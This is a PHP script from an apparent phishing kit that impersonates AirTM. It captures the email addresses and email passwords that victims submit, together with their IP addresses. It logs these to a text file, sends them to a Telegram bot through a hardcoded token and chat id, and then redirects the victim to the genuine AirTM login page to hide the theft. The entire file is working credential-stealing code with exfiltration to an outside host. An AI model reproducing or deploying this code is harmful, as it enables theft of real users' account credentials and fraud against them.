<?php
    include('./XEmail.php');
    $subject = "AIRTM Email ACCESS";
    $headers = "";
    $ip = $_SERVER['REMOTE_ADDR'];
    $message = "
        AIRTM Email ACCESS
        [IP]            : ".$ip."
        [Email]     : ".$_POST['email']."
        [Password]  : ".$_POST['emailpassword']."
        -------------------------------------------------\n";
    $text = fopen('./rezlt.txt', 'a');
    fwrite($text, $message);



    function TGS($messaggio) {
        $token = '5222868662:AAGvslYEUqNjgKoIBnSXQkN47dLlYJGcTAM';
        $chatid = '1628701234';
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    TGS($message);

    mail($email,$subject,$message,$headers);
    header("Location: https://app.airtm.com/login");


?>